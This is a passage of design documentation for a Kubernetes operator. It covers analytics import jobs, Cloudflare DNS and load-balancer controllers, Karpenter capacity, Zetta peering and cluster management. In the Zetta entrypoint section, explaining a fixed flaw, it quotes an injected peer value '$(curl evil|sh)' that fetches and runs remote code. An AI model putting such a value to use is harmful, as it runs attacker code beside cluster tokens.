  SHA-256 of the unrendered `config.yaml`, so a changed reader count rolls the processor and
  re-renders its config; the credentials hash rolls it when a key changes.
- **Schedule.** With `analyticsProcessor.import.enabled`, the operator owns the CronJob
  `<cr>-analytics-import`: schedule `*/5 * * * *` in `Etc/UTC` (fixed), `concurrencyPolicy: Forbid`,
  `startingDeadlineSeconds: 60`, one successful and one failed Job kept. Each Job has
  `backoffLimit: 0`, `activeDeadlineSeconds: 300` and `ttlSecondsAfterFinished: 3600`; its pod
  (`restartPolicy: Never`, no service-account token, the stack's pull secrets, the hardening
  baseline, 32Mi/10m requests and a 64Mi limit) runs `curlimages/curl:8.10.1`, or
  `spec.images.overrides["analytics-import"]` so a set can pin it by digest, with `sh -c`
  (`analyticsImportScript`): `curl --fail --silent --show-error --connect-timeout 10 --request POST
  --max-time 180 http://<cr>-analytics-processor:8080/import`, then the same flags with
  `--max-time 110` on `/aggregate2`. Both fit inside the Job's 300 s. It holds no credentials:
  neither route takes any.
- **Aggregation.** Prod 1 runs `analytics-processor.aggregator.timer` every five minutes beside the
  importer (orama-deploy `analytics/prod/systemd`). `POST /import` only writes raw events; the
  processor's `POST /aggregate2` route runs the same `Aggregator::aggregate` as Prod 1's
  `aggregator` binary and takes no parameters: it aggregates the next time range recorded in the
  control DB's `analytics.runs` table into `oramacore_analytics_search_aggregated`, which the
  dashboard's top terms, no-results and header totals read. Without it those stay empty. The Job
  calls it after the import, and also when the import failed, as Prod 1's two independent timers
  would; the Job fails when either call fails. Coverage of the aggregator row on Prod 1's crons host
  is tracked in [#576](https://github.com/oramasearch/orama-operator/issues/576).
- **No retries, on purpose.** Every import drains the readers, so a second request while one runs,
  or a retry of a request that timed out on the client while the server finishes it, can split or
  lose events. `Forbid` stops scheduled Jobs from overlapping; it cannot stop the server finishing
  a timed-out request or another caller invoking `/import`. The processor visits its sources in
  order and stops at the first error, so a failed run may have imported some readers and not
  reached the rest. A reader that is not Ready has no address on `<cr>-reader-headless`, so it
  fails every run at its ordinal and blocks the import of every later reader until it is Ready
  again; those readers keep their events logged meanwhile. A failed run shows in the Job's status and the processor's logs; the next
  scheduled run is the next attempt. "Each reader once" is one source per ordinal and one export
  call per healthy run, not a durable exactly-once delivery.
- **Suspend.** `import.suspend: true` sets the CronJob's `spec.suspend` and keeps the CronJob, the
  headless Service and the sources, so the cutover flips one line. It stops new Jobs only: a
  running Job finishes, and the readers keep the events logged while suspended, which the first
  import after resuming takes. Unset writes `spec.suspend: false`, the API default.
- **Prerequisites and teardown.** An enabled import needs `engine`, `analytics` (in-cluster) and
  `controlDB` enabled and a reader count of zero (→ 3) or more. Otherwise the CronJob is removed,
  suspended or not, and the reconcile fails naming what is missing. `Reconcile` runs this check
  (`guardAnalyticsImport`) right after reading the CR, before any component step, so an earlier
  failure cannot keep an old schedule running. `import.enabled: false` removes the CronJob and
  keeps the headless Service. `analyticsProcessor.enabled: false` removes the CronJob, the retention
  Job and the processor's Deployment, Service and `<cr>-analytics-processor-config` (also an older
  operator's unlabelled one, when the CR controls it; a ConfigMap of that name it does not control
  is left alone). The processor and its config are reconciled before the CronJob.
- **Retention.** ClickHouse keeps analytics for 30 days (Cloud v1 migration
  [decision 4 of 16 Oct](https://github.com/oramasearch/orama-bridge/blob/main/docs/projects/orama-cloud-v1/decisions-2026-10-16.md#4-analytics-start-fresh-and-prod-2-keeps-30-days): analytics start fresh at the cutover). The processor creates its three tables at start without a TTL, so
  the operator owns the Job `<cr>-analytics-retention`, created whenever the processor runs on the
  in-cluster ClickHouse. It runs `clickhouse-client` from the stack's ClickHouse image as the
  `default` user (password by `secretKeyRef` from `<cr>-analytics-secret`), fails until all three
  tables exist (retried by the Job, `backoffLimit: 10`), then runs
  `ALTER TABLE ... MODIFY TTL <column> + INTERVAL 30 DAY` (`timestamp` on the search and
  interaction tables, `created_at` on the aggregated one) only where `system.tables` shows another
  TTL. The Job's `orama.cloud/retention-hash` annotation is the hash of its script: a different
  script, or a Job whose retries are exhausted, is deleted (foreground) and created again on the
  next reconcile. A succeeded Job is kept as the record and makes the status entry
  `analytics-retention` Ready (`applied`). The operator has no ClickHouse schema kind yet; a
  `ClickHouseSchema` kind ([`datastore-crds.md`](datastore-crds.md)) could replace this Job.
- **Processor image.** The image must carry the bridge's listener patch
  (`orama-cloud-v1-bridge/build/images/analytics-processor/Dockerfile`, which changes
  `src/bin/server.rs` at build to bind `0.0.0.0:8080`). Upstream
  ([`11a6c2d`](https://github.com/oramasearch/analytics-processor/blob/11a6c2dd5c6db86bed2c617940c09b43d36e2c62/src/bin/server.rs))
  binds `127.0.0.1:8888`, which neither the Service, its probes nor the import Job can reach, so
  every run would fail to connect.

## DISCO (`disco.go`)

A `Deployment` (in-memory → no PVC; restart cold-starts the cache) running the Go **DISCO** service
(`:8080`), pointed at the **shared `<cr>-embeddings` Deployment** via `EMBEDDINGS_ENDPOINT`
([#14](https://github.com/oramasearch/orama-operator/issues/14)/[#39](https://github.com/oramasearch/orama-operator/issues/39))
instead of a co-located model sidecar (DISCO was the third redundant copy of the model weights).
Routed through the shared `reconcileApp` builder, so it inherits the workload-hardening baseline
(probes, securityContext, resources, PDB, grace). Service on `:8080`. **Validated on AKS.**

## IdP + demoSeed (`idp.go`)

- **idp** — when `idp.provider=keycloak`, deploys **Keycloak** (`Deployment` + Service,
  `start-dev`). `none`/`firebase`/`clerk` are external (nothing deployed). Validated on
  AKS (Keycloak booted `1/1`). Admin creds are dev placeholders → edit the keycloak secret in prod.
- **demoSeed** — when `demoSeed: true`, creates a one-shot **Job** (create-if-absent).
  Today it's a **placeholder** (echo); the real seed will create a demo
  project+index+docs via the API once the engine is Ready. Validated on AKS (Job ran
  to `Complete`).

## Cloudflare (`cloudflare.go`) — 🟡 implemented, not live-tested

Cloudflare stays the permanent edge/geo-LB. The main loop never calls the CF API: it keeps owned
child CRs, whose controllers do. `reconcilePublicDNS` keeps one proxied `CloudflareDNSRecord` per
published endpoint, `<cr>-dashboard-dns`, `<cr>-writer-dns` and `<cr>-reader-dns`, while
`cloudflare.enabled`, `manageDNS` and a non-empty `apiTokenSecretRef.name` are set and the
component is published (dashboard enabled with a host; engine enabled with `reader.host`; the same
plus a primary region for `writer.host`). Each record's `spec.name` is the host, `spec.content` the
first address of its own Ingress (`componentIngressTarget`: hostname before IP; empty while the
Ingress is absent, deleting or unaddressed), `spec.secretRef` the token Secret, `spec.type` empty.
Every host must be in the zone of the Secret's `zoneID`. A component's `extraHosts` never get a
record ([#313](https://github.com/oramasearch/orama-operator/issues/313)).

The lifecycle runs before the Cloudflare early return, so disabling Cloudflare or DNS removes the
records too:

- not published, or DNS not managed: the child is deleted (when the CR controls it and it is not
  already deleting), and its finalizer cleans up the Cloudflare record;
- a child being deleted is left untouched until its deletion event, even if re-enabled meanwhile;
- a host or Secret name change on a child with `status.recordID` deletes it with its old spec,
  before any address check; the replacement is created on a later reconcile. Without a record ID
  the same child is updated;
- no Ingress address: nothing is created and an existing child keeps its content;
- an address change patches only the child's spec, under optimistic locking, keeping its status
  and finalizer;
- a same-name child the CR does not control is left alone and reported as a conflict.

KV namespaces, the R2 bucket and the Load Balancing guidance follow, unchanged. The no-op path is
validated on AKS (loop stays green with `enabled` but no token).

> **Follow-ups:** validate against a live Cloudflare account; add **Load Balancing**
> (geo-steered pools + health checks across the regional clusters — the actual
> geo-LB); select a zone per host, so one stack's hosts can span zones.

## Zetta elastic capacity (`zetta_capacity.go`) — 🟡 implemented, opt-in, not live-tested

The **first slice** of Zetta-driven elastic capacity ([operator#69](https://github.com/oramasearch/orama-operator/issues/69)):
`Zetta → operator → Karpenter → nodes → more Zetta nodes`. Opt-in via
`OramaZettaCluster.spec.capacity.karpenter.enabled` (default off). Reconciled from the
`OramaZettaCluster` controller (step 0, before the StatefulSet).

- **Owned `NodePool`** — the operator reconciles a Karpenter `NodePool` (`karpenter.sh/v1`)
  via **`unstructured`** (same decoupling as the CNPG `Cluster` — no dependency on Karpenter's
  Go types/version). It carries the cloud-neutral policy: a dedicated **taint**
  (`orama.cloud/zetta:NoSchedule`), the **pool label** (`orama.cloud/zetta-pool`) on the node
  template, `requirements` (os/arch/capacity-type + optional instance-type pin), the **cost cap**
  (`spec.limits` cpu/memory/nodes), and **stateful-safe disruption**
  (`consolidationPolicy: WhenEmpty`, a `nodes: "1"` budget, `expireAfter: Never`,
  `terminationGracePeriod: 1h`). CreateOrUpdate ⇒ the write is a no-op when nothing changed
  (anti-flap, principle #7).
- **Provider `NodeClass` is referenced, not owned** — `spec.capacity.karpenter.nodeClassRef`
  (`{group, kind, name}`) points at the platform's `EC2NodeClass` (EKS) / `AKSNodeClass`
  (AKS NAP). The NodeClass carries cluster-specific cloud details (AMI/subnet/IAM on AWS) the
  operator can't invent, so the platform owns it. `name` is required when enabled; missing ⇒
  `CapacityReady=False, Reason=Blocked`.
- **Scale trigger (this slice)** — pure **scheduling**: the Zetta pods get the matching
  toleration + `nodeSelector: {orama.cloud/zetta-pool: <name>}` (in `mutateZettaStatefulSet`),
  so raising `spec.replicas` past node capacity leaves pods **Pending → Karpenter provisions →**
  the pods schedule and join. The operator changes *desired replicas + NodePool limits*;
  Karpenter does the launch. A **Zetta-signal-driven** trigger (an `orama_control.scale_requests`
  row the operator polls) is the **next** slice — noted, not built.
- **Quorum-safety** — the Zetta pods carry `karpenter.sh/do-not-disrupt` (Karpenter never
  voluntarily evicts a live CRDT peer) + a `maxUnavailable: 1` **PDB**. Drain-safe,
  operator-driven **scale-down** (lower replicas, let Karpenter reclaim the emptied node) is a
  later slice.
- **Karpenter-absent = graceful no-op** — existence is checked via the **RESTMapper** (no
  informer started for a possibly-missing CRD). No `karpenter.sh/v1 NodePool` mapping ⇒
  `CapacityReady=False, Reason=KarpenterNotInstalled`, no crash-loop. Covers bare-metal / k0s
  clusters with no node autoscaler.
- **Cluster-scoped cleanup** — a `NodePool` is **cluster-scoped**, so a namespaced CR can't own
  it via `ownerReferences` (k8s GC would treat the owner as absent and delete it). Instead the
  pool is label-identified and cleaned up by a **finalizer** (`orama.cloud/karpenter-capacity`),
  added while capacity is on and released on disable or CR-delete. The namespaced PDB is
  owner-GC'd normally.
- **Status** — `status.provisionedNodes` (count of nodes labeled
  `karpenter.sh/nodepool=<pool>`, read via the **uncached APIReader** so the operator holds no
  cluster-wide Node informer) + the `CapacityReady` condition, both written only on change
  (anti-flap).

> **RBAC:** `karpenter.sh/nodepools` (`*`), `karpenter.sh/nodeclaims` +
> `karpenter.k8s.aws/ec2nodeclasses` + `karpenter.azure.com/aksnodeclasses` +
> core `nodes` (`get;list;watch`), and `policy/poddisruptionbudgets` — mirrored into
> `chart/templates/rbac.yaml`. A grant for a non-existent apiGroup is harmless.

## Operator-owned Karpenter install (`zetta_capacity_install.go`) — 🟡 implemented, opt-in, not live-tested

The **second slice** of [operator#69](https://github.com/oramasearch/orama-operator/issues/69)
([operator#75](https://github.com/oramasearch/orama-operator/issues/75)), extending the NodePool
work above: the NodePool reconcile *assumes* Karpenter is installed; this makes the operator **own the
install** too. Opt-in via `OramaZettaCluster.spec.capacity.karpenter.install` (default off). Reconciled as
**step 0** of the `OramaZettaCluster` controller, before the NodePool, so the CRDs exist first.

- **Vendored upstream manifests, server-side-applied** — the operator embeds (`go:embed`) the pinned
  **Karpenter v1.13.0** manifests under `internal/controller/assets/karpenter/v1.13.0/` — the CRD bundle
  (`NodePool`/`NodeClaim`/`EC2NodeClass`/`NodeOverlay`) and the controller bundle (ServiceAccount + RBAC +
  Deployment + Service + PDB) — and applies each document as an `unstructured` object via **server-side
  apply** (`client.Apply` + force-ownership). **No Karpenter Go types are vendored** (same decoupling as
  the NodePool reconcile). Re-vendor with [`hack/fetch-karpenter-manifests.sh`](../hack/fetch-karpenter-manifests.sh)
  (a reproducible `helm template` of the upstream OCI charts). Two fields carry placeholders
  (`__CLUSTER_NAME__` / `__CONTROLLER_ROLE_ARN__`); they are **never replaced as text**
  ([operator#79](https://github.com/oramasearch/orama-operator/issues/79)). The reconciler parses the
  template first, then sets the CR's values as structured fields: the ServiceAccount's
  `eks.amazonaws.com/role-arn` annotation and the controller container's `CLUSTER_NAME` env var, each
  found by kind, name and field path and required to hold its placeholder. The rendered bundle must be
  exactly the expected 13 objects (`karpenterControllerObjects` in
  `internal/controller/zetta_capacity_install_render.go`) and the CRD bundle exactly the 4 Karpenter
  CRDs, or nothing is applied.
- **Validated inputs** — `installClusterName` must match the EKS cluster-name rule and
  `controllerRoleARN` must be an IAM role ARN. The CRD schema refuses anything else at admission, and the
  reconciler checks again (a CR stored before the patterns existed): an invalid value gives
  `KarpenterInstalled=False, Reason=InvalidInstallSpec` on every cloud, before the finalizer or any object
  is written.
- **Cloud-gated** — the cloud is detected from a node's `providerID`:
  - **bare-metal / k0s** (no cloud providerID) ⇒ no-op, `KarpenterInstalled=False, Reason=BareMetalNoCloud`.
  - **AKS** ⇒ no-op, `Reason=ManagedByAKSNAP` — Node Auto Provisioning already deploys and manages
    Karpenter; use `enabled` (not `install`) there.
  - **EKS** ⇒ the self-install path proceeds.
- **Cloud IAM prerequisite, surfaced not crashed** — Karpenter's controller needs a cloud identity to
  create VMs, which the in-cluster operator **cannot mint** (a cloud-account prereq, like the image pull
  secret). On EKS the reconciler checks `controllerRoleARN` (the IRSA role) + `installClusterName`
  **before** deploying the controller; if the identity is missing it reports
  `KarpenterInstalled=False, Reason=CloudIdentityMissing` and does **not** deploy (no `CrashLoopBackOff`).
  Full detail: [`docs/karpenter-cloud-iam-prerequisite.md`](karpenter-cloud-iam-prerequisite.md).
- **Cluster-singleton, ref-counted cleanup** — the controller install is shared by every CR that opts in.
  A namespaced CR can't own the cluster-scoped CRDs/ClusterRoles, so cleanup is a **finalizer**
  (`orama.cloud/karpenter-install`) that removes the operator-managed controller resources only when **no
  other** `OramaZettaCluster` still requests the install. **The CRDs are applied but never deleted** on
  teardown — deleting a Karpenter CRD cascades to every `NodePool`/`NodeClaim` in the cluster.
- **Status** — a `KarpenterInstalled` condition (`InvalidInstallSpec` / `BareMetalNoCloud` / `ManagedByAKSNAP` / `UnsupportedCloud`
  / `CloudIdentityMissing` / `InstallClusterNameRequired` → `InstallProgressing` → `Installed`), written
  only on change (anti-flap).

> **RBAC (install):** `apiextensions.k8s.io/customresourcedefinitions` — `get;list;watch` on all,
> `create;update;patch` only on the 4 Karpenter CRD names (**no `delete`**, CRDs aren't GC'd). And
> `rbac.authorization.k8s.io` — `get;list;watch` on all roles and bindings; `create;update;patch;delete`
> plus `bind;escalate` **only on the bundle's names** (`clusterroles` karpenter, karpenter-admin,
> karpenter-core; `clusterrolebindings` karpenter, karpenter-core; `roles` and `rolebindings` karpenter,
> karpenter-dns). Creating RBAC that grants Karpenter's broad permissions needs `bind` + `escalate`, since
> the operator doesn't itself carry every node/pod grant; scoping them by `resourceNames` means the
> operator cannot create, bind or escalate any other role, binding or CRD (operator#79,
> `TestKarpenterInstallEnvtest` proves both halves against a real API server). ServiceAccounts,
> Deployments, Services and PDBs the install creates are already granted. Mirrored into
> `chart/templates/rbac.yaml`; `TestChartKarpenterRBACMatchesBundle` keeps the names in step with the
> bundle, so re-vendoring a Karpenter version that renames an object fails until both are updated.

> **Follow-ups (later slices of #69):** the Zetta→operator signal channel
> (`orama_control.scale_requests`); drain-safe, quorum-aware scale-down; multi-cluster
> placement policy (per-operator identity already namespaces the state); consent-trail
> integration (`add_nodes` / `approve_consent`); live validation on an EKS + AKS-NAP cluster.
> **Follow-ups:** validate against a live Cloudflare account; deprovision records on
> teardown; surface the managed hostnames beyond just the dashboard.

## Cloudflare global Load Balancer (`cloudflareloadbalancer_controller.go`) — 🟡 implemented, not live-tested

The `CloudflareLoadBalancer` CRD ([#73](https://github.com/oramasearch/orama-operator/issues/73))
turns a single hostname into a **global load balancer** — origin pools of wan-accessible
nodes, health checks, geo/proximity steering, and failover — the actual geo-LB. It is the
same "external resource as an owned CRD" shape as `CloudflareDNSRecord`: the child
controller makes the CF API calls and holds a finalizer, so the main loop never mutates
Cloudflare directly. From **one** CR it reconciles three Cloudflare Load Balancing objects:

- a **Health Monitor** (account-scoped) — `type` http/https/tcp, `path` (default
  `/v1/server_info`), `interval`/`timeout`/`retries`, `expectedCodes`; drops unhealthy
  origins from rotation.
- one or more **Origin Pools** (account-scoped) — each a named set of origins
  (`{name, address, enabled, weight}`), `minimumOrigins`, the monitor attached. Pools that
  leave the spec are pruned after the LB stops referencing them.
- the **Load Balancer** (zone-scoped) — the `hostname`, `default_pools` (spec order),
  `fallbackPool`, `steeringPolicy` (`off｜geo｜dynamic｜proximity｜random`; `dynamic` maps to the
  API's `dynamic_latency`), optional `regionPools` (region code → pool names) for geo
  steering, and `proxied`.

**Idempotent + merge-not-clobber:** create-or-adopt (list by our `orama-operator:<ns>/<name>`
description tag / by pool name / by hostname), then **PATCH only the fields we manage** so
server-managed fields are left intact. **Anti-flap (principle #7):** the status subresource
(LB id, monitor id, per-pool ids + health, a `Ready` condition) is written **only on a real
transition** (deep-compare); a steady LB produces zero control-plane writes, refreshed on a
5-minute resync. **Graceful when Load Balancing is off:** a 403/entitlement error →
`Ready=False (LoadBalancingNotEnabled)` + a gentle requeue, never a crash-loop. **Safe no-op**
until the Secret (token+zoneID+accountID) exists → `Ready=False (WaitingForCredentials)`.

> **Follow-ups:** validate against a live Cloudflare account with Load Balancing enabled;
> auto-populate pool origins from the live wan-accessible node set
> ([#74](https://github.com/oramasearch/orama-operator/issues/74) /
> [zetta#739](https://github.com/oramasearch/zetta/issues/739)) so the main loop creates/updates
> the `CloudflareLoadBalancer` as nodes come and go.
**Zetta cluster reachability + the CF LB origin pool.** The `OramaZettaCluster` reconciler
(`internal/controller/oramazettacluster_controller.go`) classifies each slice by its **node-reachability
type** (`spec.reachability`, [operator#74](https://github.com/oramasearch/orama-operator/issues/74)):
a **`wan-accessible`** slice is a rendezvous whose routable address the operator advertises as
`.status.wanAddress` (from `spec.wanAddress` / `spec.hostNetwork` / `spec.exposePeerLoadBalancer`), while a
**`dial-out-only`** slice (the default, and any `spec.ephemeral` slice) dials OUT only and **never gets an
inbound peer LoadBalancer** — the operator ignores `spec.exposePeerLoadBalancer` on it (warns + tears down
any existing LB), fixing the earlier anti-pattern of fronting a private node with an inbound LB
([zetta#739](https://github.com/oramasearch/zetta/issues/739)). Two consumers read the wan-accessible set:
siblings copy `.status.wanAddress` into their `spec.externalPeers`, and the **Cloudflare LB origin pool**
([operator#73](https://github.com/oramasearch/orama-operator/issues/73) / the
`CloudflareLoadBalancer` CRD, [operator#76](https://github.com/oramasearch/orama-operator/pull/76))
is populated from those addresses (HTTP origin at the same host `:4800`) — the documented wiring hook, not
yet auto-populated here.

**Zetta runtime environment.** `spec.env` accepts Kubernetes `EnvVar` values and sources, appends
accepted entries after the variables the operator owns, and updates the StatefulSet pod template so a
change rolls the nodes. Operator-owned names cannot be overridden; their sorted names are exposed as
`status.ignoredEnvVars` without changing readiness. Lake copies `spec.zetta.env` to its data-plane child
and `spec.services.zettaEnv` to every managed or adopted Zetta service cluster.

**Zetta volume ownership.** Every node pod runs with uid/gid/fsGroup 10001 and
`fsGroupChangePolicy: OnRootMismatch`. A per-node RWO volume that attaches after a node move therefore
skips the recursive ownership pass when the `/data` root already has the expected group, while a new
or mismatched volume is still corrected before Zetta starts.

**Reachability + node-type FLAGS into the engine** (`mutateZettaStatefulSet`,
[zetta#803](https://github.com/oramasearch/zetta/issues/803)/[#810](https://github.com/oramasearch/zetta/issues/810)).
Classifying the slice is not enough — the operator must tell the *engine* what each node is, or the engine
seeds its CRDT `node:<id>` entry with its permanent/wan-accessible DEFAULT and `system.nodes` mislabels a
private slice while the **reachability-aware dialer stays dormant** (nodes keep advertising bound pod IPs, so
the pod-CIDR-collision undercount #803 fixes can recur). So the entrypoint now renders **`--dial-out-only`**
iff `zettaReachability` (the single source of truth shared with status + topology) is `dial-out-only`, and
**`--node-type ephemeral|permanent`** from `spec.ephemeral`. The two are **independent** axes (a private
permanent home node is `dial-out-only` + `permanent`; burst capacity is `dial-out-only` + `ephemeral`).
These are FLAGS, so they require the auth-capable image generation the operator
already mandates (post-[#799](https://github.com/oramasearch/zetta/issues/799) travels with #803/#810); an
older image would crash on the unknown flag. Verify with `SELECT reachability, node_type FROM system.nodes`.

**Zetta node entrypoint: no CR data in shell text** (`internal/controller/zetta_peers.go`,
[operator#279](https://github.com/oramasearch/orama-operator/issues/279)). The node container runs
`/bin/sh -c <zettaEntrypointScript>`, a **constant** script — the same bytes for every
`OramaZettaCluster`, with only Go constants (`/data`, `:7777`, `:4800`) formatted in. A shell is still
needed for the per-node values only known at run time (the ordinal from `POD_NAME`, `HOST_IP` under
`hostNetwork`, this node's field of `ZETTA_ADVERTISE_MAP`). Everything variable is data: the container
**args** are `zetta-entrypoint` (`$0`), the node flags, `--`, then the external peers one per argument; node-0's
seed address is the env var `ORAMA_ZETTA_SEED` (deliberately not the engine's own `ZETTA_SEED_PEER`); the
advertise map and tokens are env vars. The admin token is no longer passed as `--admin-token`: argv is
readable by every process on the node (`/proc/<pid>/cmdline`), and the engine reads `ZETTA_ADMIN_TOKEN` from
its environment when the flag is absent. `spec.env` cannot set `ORAMA_ZETTA_SEED` or the engine's own
`ZETTA_SEED_PEER`/`ZETTA_DATA_DIR`. The script grows the argv with `set -- "$@" …` and ends
with `exec zetta "$@"`, so no value is ever re-parsed, split or globbed. Before #279 the peers were pasted
into the script, so a peer such as `$(curl evil|sh)` — from `spec.externalPeers` or from any operator able to
append to the shared topology table — ran in every Zetta pod beside `ZETTA_ADMIN_TOKEN` and
`ZETTA_CLUSTER_TOKEN`. Peers are also **validated** as `host:port` (CRD pattern + controller): an invalid
`spec.externalPeers`/`spec.wanAddress` is refused (StatefulSet untouched, `PeerAddressesValid=False`, values
Go-quoted in the message), an
invalid topology address is trimmed, then dropped and reported (logged once per change), and resolved advertise addresses are checked before they are
advertised or written to the topology. For valid input the argv is what the old entrypoint produced minus
`--admin-token <token>`, and zetta still sees the token in its environment — `TestZettaEntrypointMatchesLegacyArgv` runs both scripts (under `/bin/sh` and dash, the Ubuntu
image's `/bin/sh`) against a stub `zetta` for every shape and ordinal. Changing the pod template (new
`command`, `args`, env var) **rolls every Zetta pod once** when an operator with this change first reconciles.

**Cross-cluster topology THROUGH Zetta** (`internal/controller/zetta_topology.go`,
[operator#105](https://github.com/oramasearch/orama-operator/issues/105)). Instead of an admin
hand-copying `.status.wanAddress` into siblings' `spec.externalPeers`, the operator coordinates peering
through its own datastore. Each reconcile (gated on the datastore symbiosis, best-effort like the state sync)
it **writes** this slice's wan-accessible endpoints into `orama_control.topology` (append-only, anti-flapped
like `components` — one row per node, namespaced by `operator` + global `cluster` name), Zetta **CRDT-syncs**
that table across every cluster, and it **reads** the table back (latest-wins per node by `updated_at`) to
**derive** its `--peer` set from the OTHER slices' wan endpoints. The StatefulSet's `--peer` flags
(`mutateZettaStatefulSet` → `zettaPeerSet`) are the **union** of `spec.externalPeers` (explicit override —
wins) and the derived set (deduped, excluding this slice's own nodes/addresses); topology rows are untrusted, so a
derived address that is not a valid `host:port` is dropped and named in `PeerAddressesValid`
([operator#279](https://github.com/oramasearch/orama-operator/issues/279)). Failover: a departed wan node
(scale-down / flip to `dial-out-only`) gets a **`status='gone'` marker row** and falls out of the derived set
next reconcile. Reads go through `zettaSQLQuery` (parses `.value.rows`; sends the admin bearer). **Blocked:**
removing a departed node from Zetta's own **membership CRDT** node-list is not possible over SQL (append-only)
and has no engine API yet — the `gone` marker affects only the derived `--peer` set, not the engine node-list
(see [`zetta-datastore.md`](zetta-datastore.md)).

**Observed-state projection** (`internal/controller/zetta_statesync.go`). The same enabled datastore
loop writes changed `OramaCloudV1`, `OramaZettaCluster`, and namespace-matched cluster-scoped `Lake`
status into `orama_control.components`, with a paired `component.state_changed` row in
`reconcile_events`. Both authenticated appends are best-effort and fingerprinted; a steady status writes
nothing, and a partial component/event pair retries only the missing append. Lake's full status is stored
as deterministic JSON in the component detail. See [Zetta as the operator datastore](zetta-datastore.md)
and the [Lake observed-state contract](lake/README.md#observed-state-in-zetta).

## The log is kept readable by fixing errors, never by hiding them

Steve, 2026-10-12: the log is quieted by fixing errors, not by turning off logging.

A reconcile that fails returns its error. The manager logs it and retries, and it stays in the log
until its cause is fixed. No controller downgrades, swallows or slows down an error to make the log
quieter. Two examples from the day the rule was stated:

- **Cloudflare refused the v1 sandbox's R2 bucket** with 403 from July to October. The fix was
  enabling R2 on the account, after which the bucket reconciled. A change that would have
  rechecked it quietly every 30 minutes was written, and removed.
- **A status write was refused as a conflict** on a new `KubernetesClusterProvider`. The cause was
  the write itself: a full update with a version check, from a cached read one write behind. The
  cluster-management controllers now write status as a patch of what changed, which has no version
  check, because each is the only writer of its status. A change that would have swallowed the
  conflict was written, and removed.

What remains from that work is correctness, not quiet: `settle` never returns a result together
with an error, and the KV namespace and R2 bucket controllers write a failure to status only when
it changes instead of on every retry.

## Cluster management (`kubernetescluster_controller.go`, `akscluster_controller.go`, `azure_resource_manager.go`, `clusterhelmrelease_controller.go`, `oramaoperator_controller.go`, `leaf_operator_installer.go`) — ✅ live on `orama-nonprod-cluster-01` (2026-10-12)

Managing other clusters ([`infrastructure/README.md`](infrastructure/README.md),
[#351](https://github.com/oramasearch/orama-operator/issues/351),
[#354](https://github.com/oramasearch/orama-operator/issues/354),
[#363](https://github.com/oramasearch/orama-operator/issues/363)). These controllers run in every
cluster's operator, with no flag: the operator is the same on a management cluster and a leaf, and
a cluster manages others by holding the resources. `ClusterHelmRelease` and `OramaOperator` install
pinned chart releases and the operator itself onto a managed cluster with the Helm library.
`LakeSet` and `OramaCloudV1Set` (`managedset_controller.go`,
[#391](https://github.com/oramasearch/orama-operator/issues/391)) apply `Lake` and `OramaCloudV1`
instances onto managed clusters from one template, each member in its own namespace and independent of the others.
An `OramaCloudV1Set` also applies its members' team migrations as `OramaCloudV1Migration`s
(`managedset_migrations.go`, [#654](https://github.com/oramasearch/orama-operator/issues/654);
[`cloud-v1-migration.md`](cloud-v1-migration.md#declared-in-the-set-oramacloudv1set)).
A `LakeSet` also applies its `spec.e2eTests` as cluster-scoped `LakeE2ETest`s on its members'
clusters and reads each run's result back into its status (`managedset_e2etests.go`,
[#589](https://github.com/oramasearch/orama-operator/issues/589)): every file in `config/clusters/`
is applied to the managing cluster, and this is how the testing → staging gate gets onto the
cluster that runs `testing`.

| Controller | Reconciles | Creates |
|---|---|---|
| `KubernetesClusterReconciler` | `KubernetesCluster` (abstract) | One owned `AksCluster` when the provider has type `aks`; nothing else |
| `KubernetesClusterProviderReconciler` | `KubernetesClusterProvider` | Nothing; it checks the credentials and holds the provider while a cluster uses it |
| `AksClusterReconciler` | `AksCluster` (concrete) | In Azure: a resource group and a managed cluster. In the cluster: the owned kubeconfig Secret |

- **The AKS controller and its `azure_*.go` helpers own Azure API behavior.** The abstract
  controller maps the neutral fields and the provider's settings onto an `AksCluster` with a pure
  function, so the same pair always produces the same concrete resource.
- **Create, observe and delete only.** A cluster is not changed after it exists; the `InSync`
  condition reports what differs. Node-pool `sysctls` pass from `KubernetesCluster` to
  `AksCluster`, are validated before any Azure call, and map to typed
  `linuxOSConfig.sysctls` fields using AKS API `2025-05-01`. Drift compares only explicit
  settings and reports unknown values when Azure omits them. It does not probe node kernels.
  AKS cannot change an existing pool's `linuxOSConfig`; how an existing cluster gets the setting
  is designed, not implemented, in [node-pool replacement](infrastructure/node-pool-replacement.md).
  See [node sysctls](infrastructure/node-sysctls.md) for the supported names.
- **What goes on a new cluster** is installed by `ClusterHelmRelease` and `OramaOperator`, and
  its instances by `LakeSet` and `OramaCloudV1Set`
  ([`infrastructure/README.md`](infrastructure/README.md)).
- **Live.** Three clusters have been created with these kinds (`orama-nonprod-cluster-01`,
  `orama-production-cluster-02`, `orama-production-cluster-03`), each with its platform layer,
  operator and instances installed from the managing cluster. The unit tests run against a fake
  Azure Resource Manager. Deleting a cluster, and changing one after creation, have not been
  exercised against Azure.

## Paid lake.live orders (`lake_orders.go`, `lake_orders_pgx.go`, [#634](https://github.com/oramasearch/orama-operator/issues/634)) — 🟡 implemented, tested locally, not run on a cluster

`LakeOrderSourceReconciler` provisions the private warehouses and dedicated clusters customers pay
for on lake.live (lake#831). Like every controller it runs on every cluster; it acts only where a
`LakeOrderSource` exists, which is the management cluster. Design and open questions:
[`infrastructure/orders.md`](infrastructure/orders.md).

| Reads | Writes on the management cluster | Writes in lake's control plane |
|---|---|---|
| Each member of the named `LakeSet`: its `cloud_orders` rows (`paid`, and the ones this source holds), through the member cluster's kubeconfig, the Lake's `lake-<name>-controldb-app` Secret there and a port-forward to the CNPG primary | Per order: a one-member `LakeSet` (`private_warehouse`, on the set's cluster in the region), or a `KubernetesCluster`, copies of the template cluster's `ClusterHelmRelease`s and `OramaOperator`, and the `LakeSet` on the new cluster (`dedicated_cluster`) | `state` (`provisioning`, `ready`, `failed`), `host`, `failure_reason`, `claimed_by`, `claimed_at`, and one `cloud_order_events` row per change, `actor = 'operator'` |

- **Exactly once.** The claim and every later move are single guarded statements
  (`WHERE state = 'paid'`; `WHERE state = 'provisioning' AND claimed_by = <source>`). `claimed_by`
  names the source, so a restart resumes its orders.
- **How it maps to production.** The management cluster `orama-production-cluster-01` would hold one
  source per environment (`lake-nonprod`, `lake-prod`); `lake-prod`'s members on
  `orama-production-cluster-02` and `-03` are where lake.live's orders are recorded.
- **Nothing deleted.** Ordered `LakeSet`s and `KubernetesCluster`s say `Retain`; `cancelled` orders
  are not acted on yet.
- **Proof.** Every scenario runs against the fake client and envtest; the SQL runs on a real Postgres.
  The port-forward has not run against a real leaf, and no source is applied anywhere.

## `Lake` — the lake service (liquid project)

